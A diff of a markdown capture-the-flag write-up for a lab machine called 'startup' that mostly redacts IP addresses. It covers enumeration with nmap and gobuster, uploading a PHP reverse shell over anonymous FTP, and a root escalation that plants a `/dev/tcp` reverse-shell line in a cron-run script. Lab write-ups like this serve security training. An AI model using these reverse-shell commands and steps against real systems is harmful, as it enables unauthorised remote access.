@@ -19,7 +19,7 @@ PORT   STATE SERVICE VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to 10.9.251.98
+|      Connected to <TARGET-IP>
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -52,12 +52,12 @@ By running `gobuster`, we can brute-force website URIs (directories and files), 
 
 1. directory enumeration scan
 ```
-user@parrot ~/CTF/startup $ gobuster dir -u 10.10.62.240 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
+user@parrot ~/CTF/startup $ gobuster dir -u <TARGET-IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.62.240
+[+] Url:                     http://<TARGET-IP>
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
@@ -67,7 +67,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/files                (Status: 301) [Size: 312] [--> http://10.10.62.240/files/]
+/files                (Status: 301) [Size: 312] [--> http://<TARGET-IP>/files/]
 Progress: 87664 / 87665 (100.00%)
 ===============================================================
 Finished
@@ -76,12 +76,12 @@ user@parrot ~/CTF/startup $
 ```
 2. DNS subdomain scan
 ```
-user@parrot ~/CTF/startup $ gobuster dns -d 10.10.62.240 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
+user@parrot ~/CTF/startup $ gobuster dns -d <TARGET-IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Domain:     10.10.62.240
+[+] Domain:     <TARGET-IP>
 [+] Threads:    10
 [+] Timeout:    1s
 [+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
@@ -95,15 +95,13 @@ Finished
 user@parrot ~/CTF/startup $
 ```
 
-The first scan discovered *TARGET-IP/files*.
-
-### Inspecting TARGET-IP/files
+### Inspecting /files
 
 ![files-image](images/files.png)
 
-The accessable files are not really helpful. They might have embedded files or data, but before checking this, we should try if the ftp folder is really writeable as anonymous. In case we can upload files over ftp and access them here, it is an ease to create a reverse-shell.
+The accessable files are not really helpful. They might have embedded files or data, but before checking this, we should try if the ftp-folder is really writeable as anonymous. In case we can upload files over ftp and access them here, it is an ease to create a reverse-shell.
 
-### Uploading a PHP reverse-shell
+## Uploading the PHP reverse-shell
 
 To log in, we just have to `ftp <TARGET-IP>` and provide **anonymous** as username and a blank password.
 Next, prepare the reverse-shell. There are a lot of scripts out there, I recommend [this](https://gitlab.com/kalilinux/packages/webshells/-/blob/kali/master/php/php-reverse-shell.php?ref_type=heads). The only thing we have to do is changing a couple of parameters inside of it.
@@ -111,7 +109,6 @@ Next, prepare the reverse-shell. There are a lot of scripts out there, I recomme
 ![revshell](images/revshell.png)
 
 To get the file on the server, we could directly use the `ftp` cli utility, or a GUI-Client like <u>Filezilla</u>.
-It worked like a charm.
 
 ![success](images/files_afterupload.png)
 
@@ -120,7 +117,7 @@ Afterwards, we just have to set up a listener on our attacking-machine and execu
 ```
 user@parrot ~ $ nc -lvnp 9001
 listening on [any] 9001 ...
-connect to [10.9.251.98] from (UNKNOWN) [10.10.62.240] 45424
+connect to [<TARGET-IP>] from (UNKNOWN) 45424
 Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  12:12:45 up  1:15,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -133,7 +130,7 @@ www-data
 www-data@startup:/$ 
 ```
 
-### First flag
+## First flag
 The first flag can be obtained directly from the root-directory.
 ```
 www-data@startup:/$ ls
@@ -146,17 +143,14 @@ www-data@startup:/$ cat recipe.txt
 ```
 Output: XXXX
 
-### Second flag (user-flag)
-*/home* has one sub-directory for a user named lennie. Right now, we are logged in as **www-data** and cannot access lennie's home-directory.
-After some exploration, there is a strange directory in the root-directory called */incidents*, including a <u>wireshark</u> capture, **incidents.pcapng**.
+## Second flag (user-flag)
+*/home* has one sub-directory for a user named lennie. Right now, we are logged in as **www-data** and cannot access it.
+After some exploration, there is a strange directory called */incidents*, including a <u>wireshark</u> capture, **incidents.pcapng**.
 '*.pcapng' files contain a dump of network traffic data. Analyzing this might leak some information that helps us to proceed.
-
-There is a lot going on, but I found this.
 
 ![image-wireshark](images/wireshark.png)
 
 The corresponding TCP-Stream gives us this:
-(to get the to the TCP-Stream, right-click the line -> Follow -> TCP-Stream)
 
 ```
 www-data@startup:/$ cd home
@@ -203,11 +197,11 @@ XXX{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
 lennie@startup:~$ 
 ```
 
-### Third flag (root-flag)
+## Third flag (root-flag)
 Before going for the root-flag, we can transfer from our reverse-shell (tty) to an SSH connection. We know what lennie's credentials are and SSH is generally more stable.
 ```
-user@parrot ~ $ ssh lennie@10.10.62.240
-lennie@10.10.62.240's password: 
+user@parrot ~ $ ssh lennie@<TARGET-IP>
+lennie@<TARGET-IP>'s password: 
 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -218,13 +212,12 @@ Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
 30 updates are security updates.
 
 
-Last login: Wed Apr 24 13:14:31 2024 from 10.9.251.98
+Last login: Wed Apr 24 13:14:31 2024 from XX.X.XXX.XX
 $ 
 ```
 
 Next up I tried `sudo -l`, but unfortunately, lennie is not allowed to use `sudo`, so there has to be something else.
-We have not inspected the other files in lennie's directory yet.
-The Documents directory does not contain anything useful, the scripts one looks promising. It contains the file "planner.sh".
+The */home/lennie/scripts/* looks promising. It contains the file "planner.sh".
 ```
 $ cat planner.sh
 #!/bin/bash
@@ -232,7 +225,7 @@ echo $LIST > /home/lennie/scripts/startup_list.txt
 /etc/print.sh
 $ 
 ```
-Sadly we cannot modify its content, because the file belongs to root and lennie has not enough permissions to write to it. It does execute another script thought.
+Sadly, we cannot modify its content, because the file belongs to root and lennie has not enough permission to write to it. It does execute another script though.
 ```
 $ cat /etc/print.sh
 #!/bin/bash
@@ -248,12 +241,11 @@ The */etc/print.sh* script belongs to lennie, so we can freely modify its conten
 ```
 $ cat /etc/print.sh
 #!/bin/bash
-/bin/bash -i >& /dev/tcp/10.9.251.98/4444 0>&1
+/bin/bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1
 $ 
 ```
 The problem: print.sh or planner.sh need to be executed as root if we want to receive a root-shell.
-The key: 
-The startup_list.txt seems to get updated every minute or so. Assuming there is a service, running as root, executing the planner.sh file which modifies the .txt file, we would need to just wait until the next execution cycle. Remember, if planner.sh gets executed as root, our print.sh gets also executed as root, sending a reverse shell back to us. Lets set up an appropriate listener and wait for it.
+The key: The startup_list.txt seems to get modified every minute or so. Assuming there is a service, running as root, executing the planner.sh script, which modifies the .txt file and would also execute print.sh, we would just need to wait for the next cycle. If print.sh gets executed as root, we will retrieve a root-shell.
 `user@parrot ~ $ nc -lvnp 4444`
 
 It worked. We are root.
